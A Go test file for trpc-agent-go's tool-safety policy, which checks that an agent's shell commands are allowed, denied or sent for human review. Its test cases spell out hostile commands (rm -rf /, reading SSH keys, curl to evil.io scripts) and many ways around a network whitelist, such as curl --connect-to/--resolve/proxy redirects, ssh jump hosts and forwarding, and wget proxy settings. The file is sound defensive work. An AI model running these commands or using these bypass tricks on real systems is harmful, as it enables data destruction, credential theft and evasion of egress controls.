//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"path/filepath"
	"strings"
	"testing"
)

// Synthetic secrets are assembled at runtime so no PAT-shaped or auth-header
// literal sits in source for repository secret scanners to flag, while still
// matching the shipped secret patterns.
func fakeGitHubPAT() string   { return "ghp_" + strings.Repeat("a", 36) }             // ghp_[0-9A-Za-z]{36}
func fakeAWSKey() string      { return "AKIA" + strings.Repeat("A", 16) }             // AKIA[0-9A-Z]{16}
func fakeBearerToken() string { return "Bearer " + "tkn-" + strings.Repeat("x", 16) } // bearer\s+...

// loadExamplePolicy loads the shipped example policy for rule tests.
func loadExamplePolicy(t *testing.T) *Policy {
	t.Helper()
	p, err := LoadPolicy(filepath.Join("testdata", "tool_safety_policy.yaml"))
	if err != nil {
		t.Fatalf("LoadPolicy: %v", err)
	}
	return p
}

// scanCmd is a convenience for scanning a workspace command string.
func scanCmd(t *testing.T, p *Policy, backend, command string) ([]Finding, Decision) {
	t.Helper()
	findings, decision, _ := p.scan(ExecRequest{Command: command}, backend)
	return findings, decision
}

func hasRule(findings []Finding, ruleID string) bool {
	for _, f := range findings {
		if f.RuleID == ruleID {
			return true
		}
	}
	return false
}

func TestRulesDecisionMatrix(t *testing.T) {
	p := loadExamplePolicy(t)
	cases := []struct {
		name     string
		backend  string
		req      ExecRequest
		decision Decision
		wantRule string // expected rule id (empty = no specific assertion)
	}{
		{"safe go test", BackendWorkspace, ExecRequest{Command: "go test ./..."}, DecisionAllow, ""},
		{"rm -rf root", BackendWorkspace, ExecRequest{Command: "rm -rf /"}, DecisionDeny, ruleDangerousID},
		{"read ssh key", BackendWorkspace, ExecRequest{Command: "cat ~/.ssh/id_rsa"}, DecisionDeny, ruleCredID},
		{"curl non-whitelist", BackendWorkspace, ExecRequest{Command: "curl http://evil.io/x.sh"}, DecisionDeny, ruleNetworkID},
		{"curl whitelist", BackendWorkspace, ExecRequest{Command: "curl https://github.com/a/b"}, DecisionAllow, ""},
		{"bash wrapper", BackendWorkspace, ExecRequest{Command: `bash -c "curl http://evil.io"`}, DecisionDeny, ruleShellID},
		{"legit pipe", BackendWorkspace, ExecRequest{Command: "cat a.txt | grep x"}, DecisionAllow, ""},
		{"pip install", BackendWorkspace, ExecRequest{Command: "pip install requests"}, DecisionReview, ruleDepID},
		{"long sleep", BackendWorkspace, ExecRequest{Command: "sleep 600"}, DecisionReview, ruleResourceID},
		{"unbounded yes", BackendWorkspace, ExecRequest{Command: "yes"}, DecisionDeny, ruleResourceID},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings, decision, _ := p.scan(tc.req, tc.backend)
			if decision != tc.decision {
				t.Errorf("decision = %q, want %q (findings: %+v)", decision, tc.decision, findings)
			}
			if tc.wantRule != "" && !hasRule(findings, tc.wantRule) {
				t.Errorf("missing rule %q in findings: %+v", tc.wantRule, findings)
			}
		})
	}
}

// TestCommandPolicyVsShellBypass pins the taxonomy split: a plain command that
// is merely not in the allow list is an allow-list miss (R-CMD-001), while a
// shell wrapper that can bypass the allow/deny list is a shell bypass
// (R-SHELL-001). Both deny, but they must not share a rule id.
func TestCommandPolicyVsShellBypass(t *testing.T) {
	p := loadExamplePolicy(t)

	// "rm" is not in commands.allowed and is not a wrapper -> R-CMD-001.
	findings, decision := scanCmd(t, p, BackendWorkspace, "rm -rf /")
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleCmdID) {
		t.Errorf("plain allow-list miss should be R-CMD-001: %+v", findings)
	}
	if hasRule(findings, ruleShellID) {
		t.Errorf("allow-list miss must not be tagged R-SHELL-001: %+v", findings)
	}
	if !hasRule(findings, ruleDangerousID) {
		t.Errorf("rm -rf / must still trip R-DEL-001 (defense in depth): %+v", findings)
	}

	// "bash -c ..." is a re-executing wrapper -> R-SHELL-001, not R-CMD-001.
	findings, decision = scanCmd(t, p, BackendWorkspace, `bash -c "curl http://evil.io"`)
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleShellID) {
		t.Errorf("shell wrapper should be R-SHELL-001: %+v", findings)
	}
	if hasRule(findings, ruleCmdID) {
		t.Errorf("shell wrapper must not be tagged R-CMD-001: %+v", findings)
	}
}

func TestRuleHostBackgroundPTY(t *testing.T) {
	p := loadExamplePolicy(t)
	req := ExecRequest{Command: "sleep 5", Background: true, PTY: true}
	findings, decision, _ := p.scan(req, BackendHost)
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleHostID) {
		t.Errorf("missing R-HOST-001: %+v", findings)
	}
}

func TestRuleHostSudo(t *testing.T) {
	p := loadExamplePolicy(t)
	findings, decision, _ := p.scan(ExecRequest{Command: "sudo rm file"}, BackendHost)
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleHostID) {
		t.Errorf("missing R-HOST-001 for sudo: %+v", findings)
	}
}

func TestRuleSecretInCommand(t *testing.T) {
	p := loadExamplePolicy(t)
	cmd := `curl -H "Authorization: ` + fakeBearerToken() + `" https://github.com/x`
	findings, decision, _ := p.scan(ExecRequest{Command: cmd}, BackendWorkspace)
	if !hasRule(findings, ruleSecretID) {
		t.Errorf("missing R-SECRET-001: %+v", findings)
	}
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review", decision)
	}
}

func TestRuleSecretInUnparsableCommand(t *testing.T) {
	// $VAR makes shellsafe reject the command; the secret rule must still run
	// on the raw command string so a secret is not a blind spot.
	p := loadExamplePolicy(t)
	cmd := "echo $TOKEN " + fakeAWSKey()
	findings, _, _ := p.scan(ExecRequest{Command: cmd}, BackendWorkspace)
	if !hasRule(findings, ruleShellID) {
		t.Errorf("expected shell-bypass finding for $VAR: %+v", findings)
	}
	if !hasRule(findings, ruleSecretID) {
		t.Errorf("secret rule must still fire on unparsable command: %+v", findings)
	}
}

func TestRuleEnvKeyWhitelist(t *testing.T) {
	p := loadExamplePolicy(t) // allowed_keys: PATH, HOME, LANG, GOFLAGS, GOPROXY
	// A non-whitelisted key is flagged.
	req := ExecRequest{Command: "go test ./...", Env: map[string]string{"INJECTED": "x"}}
	findings, decision, _ := p.scan(req, BackendWorkspace)
	if !hasRule(findings, ruleEnvID) {
		t.Errorf("missing R-ENV-001 for non-whitelisted key: %+v", findings)
	}
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review", decision)
	}
	// A whitelisted key is not flagged.
	ok := ExecRequest{Command: "go test ./...", Env: map[string]string{"PATH": "/usr/bin"}}
	findings, decision, _ = p.scan(ok, BackendWorkspace)
	if hasRule(findings, ruleEnvID) {
		t.Errorf("whitelisted key should not be flagged: %+v", findings)
	}
	if decision != DecisionAllow {
		t.Errorf("decision = %q, want allow", decision)
	}
}

func TestRuleEnvKeyOptIn(t *testing.T) {
	// With no allowed_keys configured the rule is inert.
	p := DefaultPolicy()
	if err := p.compile(); err != nil {
		t.Fatalf("compile: %v", err)
	}
	req := ExecRequest{Command: "ls", Env: map[string]string{"ANYTHING": "x"}}
	findings, _, _ := p.scan(req, BackendWorkspace)
	if hasRule(findings, ruleEnvID) {
		t.Errorf("R-ENV-001 should be inert without allowed_keys: %+v", findings)
	}
}

func TestRuleSecretInEnv(t *testing.T) {
	p := loadExamplePolicy(t)
	req := ExecRequest{
		Command: "go test ./...",
		Env:     map[string]string{"API_TOKEN": fakeGitHubPAT()},
	}
	findings, _, _ := p.scan(req, BackendWorkspace)
	if !hasRule(findings, ruleSecretID) {
		t.Errorf("missing R-SECRET-001 for env value: %+v", findings)
	}
}

func TestRuleDependencyWithLeadingFlags(t *testing.T) {
	p := loadExamplePolicy(t)
	findings, _ := scanCmd(t, p, BackendWorkspace, "pip install -U requests")
	if !hasRule(findings, ruleDepID) {
		t.Errorf("missing R-DEP-001 with leading flag: %+v", findings)
	}
}

func TestUnparsableFailsClosed(t *testing.T) {
	p := loadExamplePolicy(t) // unparsable_action: deny
	findings, decision := scanCmd(t, p, BackendWorkspace, "echo $(whoami)")
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny for command substitution", decision)
	}
	if !hasRule(findings, ruleShellID) {
		t.Errorf("missing R-SHELL-001: %+v", findings)
	}
}

func TestUnparsableAskWhenConfigured(t *testing.T) {
	p := loadExamplePolicy(t)
	p.UnparsableAction = ActionAsk // simulate a more permissive policy
	_, decision := scanCmd(t, p, BackendWorkspace, "echo `whoami`")
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review", decision)
	}
}

// TestExplicitAllowOverrideBeatsDenyDefault pins the fix for a finding that is
// relaxed to allow under a deny-by-default policy. "pip install requests" fires
// only R-DEP-001; overriding that rule to allow must win, not silently fall back
// to default_action: deny.
func TestExplicitAllowOverrideBeatsDenyDefault(t *testing.T) {
	p := loadExamplePolicy(t)
	p.DefaultAction = ActionDeny // deny-by-default posture
	p.RuleOverrides = map[string]Override{ruleDepID: {Action: ActionAllow}}
	findings, decision := scanCmd(t, p, BackendWorkspace, "pip install requests")
	if !hasRule(findings, ruleDepID) {
		t.Fatalf("expected R-DEP-001 to fire: %+v", findings)
	}
	if decision != DecisionAllow {
		t.Errorf("decision = %q, want allow (explicit allow override lost to deny default)", decision)
	}
}

func TestHasRecursiveForce(t *testing.T) {
	yes := [][]string{
		{"-rf", "/"}, {"-fr", "x"}, {"-Rf", "x"}, {"-r", "-f", "x"},
		{"--recursive", "--force", "x"}, {"-r", "--force", "x"},
	}
	for _, args := range yes {
		if !hasRecursiveForce(args) {
			t.Errorf("hasRecursiveForce(%v) = false, want true", args)
		}
	}
	no := [][]string{{"-r", "x"}, {"-f", "x"}, {"file"}, {"-v", "x"}}
	for _, args := range no {
		if hasRecursiveForce(args) {
			t.Errorf("hasRecursiveForce(%v) = true, want false", args)
		}
	}
}

// TestCurlConnectionRedirectBypass covers curl options that redirect the
// connection to a host different from the request URL. The real destination must
// be extracted so it cannot ride a whitelisted request host past the whitelist.
func TestCurlConnectionRedirectBypass(t *testing.T) {
	p := loadExamplePolicy(t) // allows github.com; on_non_whitelisted: deny
	cases := []struct {
		name string
		cmd  string
	}{
		{"connect-to space form", `curl --connect-to github.com:443:evil.io:443 https://github.com/a`},
		{"connect-to equals form", `curl --connect-to=github.com:443:evil.io:443 https://github.com/a`},
		{"connect-to match-any host1", `curl --connect-to :443:evil.io:443 https://github.com/a`},
		{"resolve pins to ip", `curl --resolve github.com:443:1.2.3.4 https://github.com/a`},
		{"resolve equals form", `curl --resolve=github.com:443:5.6.7.8 https://github.com/a`},
		{"proxy host", `curl -x http://evil.io:3128 https://github.com/a`},
		{"proxy equals form", `curl --proxy=socks5://attacker.test:1080 https://github.com/a`},
		{"proxy no scheme", `curl -x evil.io:3128 https://github.com/a`},
		{"proxy bundled short flag", `curl -sx http://evil.io:3128 https://github.com/a`},
		{"proxy inline short flag", `curl -xevil.io:3128 https://github.com/a`},
		{"url out of band equals", `curl --url=evil.io`},
		{"url out of band space", `curl --url evil.io`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings, decision := scanCmd(t, p, BackendWorkspace, tc.cmd)
			if decision != DecisionDeny {
				t.Errorf("decision = %q, want deny (findings: %+v)", decision, findings)
			}
			if !hasRule(findings, ruleNetworkID) {
				t.Errorf("missing R-NET-001 for redirect bypass: %+v", findings)
			}
		})
	}

	// A --connect-to whose real target is itself whitelisted must still allow.
	findings, decision := scanCmd(t, p, BackendWorkspace,
		`curl --connect-to github.com:443:github.com:443 https://github.com/a`)
	if decision != DecisionAllow {
		t.Errorf("whitelisted connect-to should allow, got %q: %+v", decision, findings)
	}
}

// TestCurlOpaqueConfigFailsClosed covers -K/--config: the file can define url,
// proxy and resolve directives the guard cannot read, so its presence must
// fail closed regardless of the whitelist.
func TestCurlOpaqueConfigFailsClosed(t *testing.T) {
	p := loadExamplePolicy(t)
	for _, cmd := range []string{
		`curl -K /tmp/opaque.conf https://github.com/a`,
		`curl --config /tmp/opaque.conf https://github.com/a`,
		`curl --config=/tmp/opaque.conf https://github.com/a`,
		`curl -sK /tmp/opaque.conf https://github.com/a`, // -K bundled with -s
	} {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionDeny {
			t.Errorf("opaque config must fail closed for %q, got %q: %+v", cmd, decision, findings)
		}
		if !hasRule(findings, ruleNetworkID) {
			t.Errorf("missing R-NET-001 for opaque config %q: %+v", cmd, findings)
		}
	}
}

// TestCurlSafeFlagsAllow guards against over-blocking: common curl flag usage
// against a whitelisted host must still be allowed after the option-parsing
// hardening.
func TestCurlSafeFlagsAllow(t *testing.T) {
	p := loadExamplePolicy(t)
	for _, cmd := range []string{
		`curl https://github.com/org/repo`,
		`curl -sSL -o out.txt https://github.com/org/repo`,
		`curl -H "Accept: application/json" https://github.com/a`,
		`curl --output out.txt --user-agent bot https://github.com/a`,
		`curl --url https://github.com/a`,
		`curl --connect-to github.com:443:github.com:443 https://github.com/a`,
	} {
		_, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionAllow {
			t.Errorf("safe curl usage should allow, got %q for %q", decision, cmd)
		}
	}
}

func TestHostsFromColonSpec(t *testing.T) {
	got := hostsFromColonSpec("github.com:443:evil.io:443")
	if len(got) != 2 || got[0] != "github.com" || got[1] != "evil.io" {
		t.Errorf("connect-to spec hosts = %v, want [github.com evil.io]", got)
	}
	got = hostsFromColonSpec("github.com:443:1.2.3.4")
	if len(got) != 2 || got[1] != "1.2.3.4" {
		t.Errorf("resolve spec hosts = %v, want github.com + 1.2.3.4", got)
	}
	got = hostsFromColonSpec("example.com:443:[2001:db8::1]")
	if len(got) != 2 || got[0] != "2001:db8::1" || got[1] != "example.com" {
		t.Errorf("bracketed IPv6 hosts = %v, want [2001:db8::1 example.com]", got)
	}
}

// TestCurlResolveUnbracketedIPv6Deny covers --resolve rewrites whose target is
// an unbracketed IPv6 literal or a "+"-prefixed host. curl keeps everything
// after the second colon as the address list, so the address must be extracted
// whole; the generic colon splitter would shatter it and leak the rewrite past
// the whitelist.
func TestCurlResolveUnbracketedIPv6Deny(t *testing.T) {
	p := loadExamplePolicy(t) // allows github.com; on_non_whitelisted: deny
	for _, cmd := range []string{
		`curl --resolve github.com:443:2001:db8::1 https://github.com/a`,
		`curl --resolve github.com:443:fe80::1 https://github.com/a`,
		`curl --resolve=github.com:443:2001:db8::1 https://github.com/a`,
		`curl --resolve +github.com:443:2001:db8::1 https://github.com/a`,
		`curl --resolve github.com:443:+example.com https://github.com/a`,
		// Multiple addresses: an evil address alongside a benign one still trips.
		`curl --resolve github.com:443:1.1.1.1,2001:db8::99 https://github.com/a`,
	} {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionDeny {
			t.Errorf("resolve rewrite must deny for %q, got %q: %+v", cmd, decision, findings)
		}
		if !hasRule(findings, ruleNetworkID) {
			t.Errorf("missing R-NET-001 for %q: %+v", cmd, findings)
		}
	}
}

// TestHostsFromResolveSpec unit-checks the --resolve address-tail parser.
func TestHostsFromResolveSpec(t *testing.T) {
	cases := []struct {
		spec string
		want []string
	}{
		{"github.com:443:2001:db8::1", []string{"github.com", "2001:db8::1"}},
		{"github.com:443:[2001:db8::1]", []string{"github.com", "2001:db8::1"}},
		{"+github.com:443:1.2.3.4", []string{"github.com", "1.2.3.4"}},
		{"github.com:443:1.1.1.1,2001:db8::99", []string{"github.com", "1.1.1.1", "2001:db8::99"}},
		{"github.com:443", []string{"github.com"}}, // no address list
	}
	for _, tc := range cases {
		got := hostsFromResolveSpec(tc.spec)
		if len(got) != len(tc.want) {
			t.Errorf("hostsFromResolveSpec(%q) = %v, want %v", tc.spec, got, tc.want)
			continue
		}
		for i := range got {
			if got[i] != tc.want[i] {
				t.Errorf("hostsFromResolveSpec(%q) = %v, want %v", tc.spec, got, tc.want)
				break
			}
		}
	}
}

// TestCurlImplicitCurlrcConfigurable covers the opt-in fail-closed for curl's
// implicit default config (~/.curlrc et al.). It is off by default (a plain
// whitelisted curl still allows), and when enabled it denies unless -q/--disable
// is the first option.
func TestCurlImplicitCurlrcConfigurable(t *testing.T) {
	// Default policy: knob off -> whitelisted curl still allows.
	pOff := loadExamplePolicy(t)
	if pOff.Network.CurlRequireDisabledConfig {
		t.Fatalf("curl_require_disabled_config should default to false")
	}
	if _, dec := scanCmd(t, pOff, BackendWorkspace, `curl https://github.com/a`); dec != DecisionAllow {
		t.Errorf("knob off: plain whitelisted curl should allow, got %q", dec)
	}

	// Knob on -> fail closed unless -q/--disable is first.
	pOn := loadExamplePolicy(t)
	pOn.Network.CurlRequireDisabledConfig = true
	deny := []string{
		`curl https://github.com/a`,       // no -q: implicit config active
		`curl -s https://github.com/a`,    // -s is boolean, not -q
		`curl -v -q https://github.com/a`, // -q not first: config already read
		`curl -sq https://github.com/a`,   // bundled: not the literal first option
	}
	for _, cmd := range deny {
		findings, dec := scanCmd(t, pOn, BackendWorkspace, cmd)
		if dec != DecisionDeny {
			t.Errorf("knob on: %q should deny, got %q: %+v", cmd, dec, findings)
		}
		if !hasRule(findings, ruleNetworkID) {
			t.Errorf("knob on: missing R-NET-001 for %q: %+v", cmd, findings)
		}
	}
	allow := []string{
		`curl -q https://github.com/a`,        // -q first: config disabled
		`curl --disable https://github.com/a`, // long form first
	}
	for _, cmd := range allow {
		if _, dec := scanCmd(t, pOn, BackendWorkspace, cmd); dec != DecisionAllow {
			t.Errorf("knob on: %q should allow (config disabled), got %q", cmd, dec)
		}
	}
}

func TestExtractHosts(t *testing.T) {
	hosts := extractHosts("curl", []string{"-s", "https://evil.io/p", "-o", "config.yaml"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (config.yaml must not be a host)", hosts)
	}
	hosts = extractHosts("ssh", []string{"user@host.example.com"})
	if len(hosts) != 1 || hosts[0] != "host.example.com" {
		t.Errorf("hosts = %v, want [host.example.com]", hosts)
	}
	hosts = extractHosts("nc", []string{"target.io", "443"})
	if len(hosts) != 1 || hosts[0] != "target.io" {
		t.Errorf("hosts = %v, want [target.io]", hosts)
	}
	// Raw IP must not bypass the whitelist (domainLike rejects it; ParseIP accepts).
	hosts = extractHosts("ssh", []string{"1.2.3.4"})
	if len(hosts) != 1 || hosts[0] != "1.2.3.4" {
		t.Errorf("hosts = %v, want [1.2.3.4]", hosts)
	}
	// scp user@host:/path — the path must not hide the host.
	hosts = extractHosts("scp", []string{"user@evil.io:/tmp/a", "."})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io]", hosts)
	}
	// scp host:/path without a user.
	hosts = extractHosts("scp", []string{"evil.io:/tmp/a"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io]", hosts)
	}
	// Bare host to curl (no scheme) must still be parsed as a host.
	hosts = extractHosts("curl", []string{"evil.io"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (bare curl host)", hosts)
	}
	// Boolean flags before a bare host must not swallow the host: -sSL/-v take
	// no value, so evil.io is still the host.
	hosts = extractHosts("curl", []string{"-sSL", "evil.io"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (curl -sSL evil.io)", hosts)
	}
	// A value-taking option consumes its operand: -o config.yaml is a filename,
	// only the bare host that follows counts.
	hosts = extractHosts("curl", []string{"-o", "config.yaml", "evil.io"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (config.yaml is -o value)", hosts)
	}
	// The --flag=value form is self-contained and consumes no operand.
	hosts = extractHosts("curl", []string{"--output=config.yaml", "evil.io"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (--output=config.yaml)", hosts)
	}
	// wget bare host.
	hosts = extractHosts("wget", []string{"-q", "evil.io"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (wget -q evil.io)", hosts)
	}
}

// TestExtractGenericHostBearingOptions pins that host-bearing options of the
// non-curl download commands (ssh/scp -J jump hosts, ssh -W/-L/-R forwarding
// specs, nc -x proxy) contribute their real targets, across space, inline and
// bundled short-flag forms, and that value-taking options consume their
// operand so it is not mistaken for a host.
func TestExtractGenericHostBearingOptions(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want []string
	}{
		{"ssh jump space", "ssh", []string{"-J", "evil.io", "github.com"}, []string{"evil.io", "github.com"}},
		{"ssh jump inline", "ssh", []string{"-Jevil.io", "github.com"}, []string{"evil.io", "github.com"}},
		{"ssh jump bundled", "ssh", []string{"-vJ", "evil.io", "github.com"}, []string{"evil.io", "github.com"}},
		{"ssh jump hop list", "ssh", []string{"-J", "user@evil.io:2222,relay.example:22", "github.com"},
			[]string{"evil.io", "relay.example", "github.com"}},
		{"ssh remote forward", "ssh", []string{"-R", "8080:evil.io:80", "github.com"}, []string{"evil.io", "github.com"}},
		{"ssh stdio forward", "ssh", []string{"-W", "evil.io:443", "github.com"}, []string{"evil.io", "github.com"}},
		{"nc proxy", "nc", []string{"-x", "evil.io:1080", "github.com", "443"}, []string{"evil.io", "github.com"}},
		// Value-taking options consume their operand: key.pem / 2222 are not hosts.
		{"ssh identity file", "ssh", []string{"-i", "key.pem", "user@github.com"}, []string{"github.com"}},
		{"ssh port", "ssh", []string{"-p", "2222", "github.com"}, []string{"github.com"}},
		{"wget bundled output", "wget", []string{"-qO", "out.tar.gz", "https://github.com/a"}, []string{"github.com"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := extractHosts(tc.cmd, tc.args)
			if strings.Join(got, " ") != strings.Join(tc.want, " ") {
				t.Errorf("extractHosts(%s, %v) = %v, want %v", tc.cmd, tc.args, got, tc.want)
			}
		})
	}
}

// TestGenericDownloadOptionBypassDeny covers the non-curl equivalents of the
// curl egress-redirect/opaque-config bypasses: host-bearing options (ssh/scp
// -J, nc -x) and opaque egress controls (wget -e/--execute/--config, ssh/scp
// -o/-F, scp -S) must not ride a whitelisted request host past
// network.allowed_domains.
func TestGenericDownloadOptionBypassDeny(t *testing.T) {
	p := loadExamplePolicy(t) // allows github.com; on_non_whitelisted: deny
	cases := []struct {
		name string
		cmd  string
	}{
		{"wget execute proxy equals", `wget --execute=http_proxy=http://evil.io https://github.com/a`},
		{"wget execute proxy space", `wget --execute http_proxy=http://evil.io https://github.com/a`},
		{"wget -e short", `wget -e use_proxy=on https://github.com/a`},
		{"wget -e bundled", `wget -qe use_proxy=on https://github.com/a`},
		{"wget config equals", `wget --config=/tmp/wgetrc https://github.com/a`},
		{"wget config space", `wget --config /tmp/wgetrc https://github.com/a`},
		{"ssh -o option", `ssh -o ProxyCommand=/tmp/x github.com`},
		{"ssh -o inline", `ssh -oProxyJump=evil.io github.com`},
		{"ssh config file", `ssh -F /tmp/cfg github.com`},
		{"ssh jump host", `ssh -J evil.io github.com`},
		{"ssh jump inline", `ssh -Jevil.io github.com`},
		{"ssh jump hop list", `ssh -J user@evil.io:2222,github.com github.com`},
		{"ssh stdio forward", `ssh -W evil.io:443 github.com`},
		{"ssh remote forward", `ssh -R 8080:evil.io:80 github.com`},
		{"scp jump host", `scp -J evil.io file user@github.com:/tmp/`},
		{"scp -o option", `scp -o ProxyJump=evil.io file user@github.com:/tmp/`},
		{"scp transport program", `scp -S /tmp/fake-ssh file user@github.com:/tmp/`},
		{"nc proxy", `nc -x evil.io:1080 github.com 443`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings, decision := scanCmd(t, p, BackendWorkspace, tc.cmd)
			if decision != DecisionDeny {
				t.Errorf("decision = %q, want deny (findings: %+v)", decision, findings)
			}
			if !hasRule(findings, ruleNetworkID) {
				t.Errorf("missing R-NET-001: %+v", findings)
			}
		})
	}
}

// TestGenericDownloadSafeFlagsAllow guards against over-blocking: common wget
// flag usage against a whitelisted host must still be allowed after the
// generic option hardening. (ssh/scp cannot appear here: they are not in the
// example policy's commands.allowed, so R-CMD-001 would deny regardless.)
func TestGenericDownloadSafeFlagsAllow(t *testing.T) {
	p := loadExamplePolicy(t)
	for _, cmd := range []string{
		`wget https://github.com/org/repo`,
		`wget -q -O out.txt https://github.com/a`,
		`wget -qO out.txt https://github.com/a`,
		`wget --header "Accept: application/json" https://github.com/a`,
		`wget --user-agent bot --tries=3 https://github.com/a`,
	} {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionAllow {
			t.Errorf("safe wget usage should allow, got %q for %q: %+v", decision, cmd, findings)
		}
	}
}

// TestBareHostNetworkDeny pins that a bare (schemeless) host argument to curl or
// wget is denied by R-NET-001 when it is not whitelisted, closing the
// "curl evil.io" bypass.
func TestBareHostNetworkDeny(t *testing.T) {
	p := loadExamplePolicy(t)
	for _, cmd := range []string{
		"curl evil.io",
		"curl -sSL evil.io/install.sh",
		"wget evil.io",
	} {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionDeny {
			t.Errorf("%q: decision = %q, want deny (findings: %+v)", cmd, decision, findings)
		}
		if !hasRule(findings, ruleNetworkID) {
			t.Errorf("%q: missing R-NET-001: %+v", cmd, findings)
		}
	}
}
